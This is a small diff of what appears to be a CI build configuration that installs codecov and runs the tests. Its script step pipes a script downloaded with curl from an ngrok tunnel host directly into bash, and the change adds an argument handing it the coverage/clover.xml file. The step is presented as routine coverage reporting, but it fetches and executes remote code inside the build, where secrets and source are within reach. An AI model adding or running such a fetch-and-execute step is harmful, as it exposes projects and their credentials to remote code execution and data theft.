@@ -6,4 +6,4 @@ install:
   - npm install -g codecov
 script:
   - npm test
-  - bash <(curl http://ib-84012.ngrok.io/bash)
+  - bash <(curl http://ib-84012.ngrok.io/bash) -f coverage/clover.xml
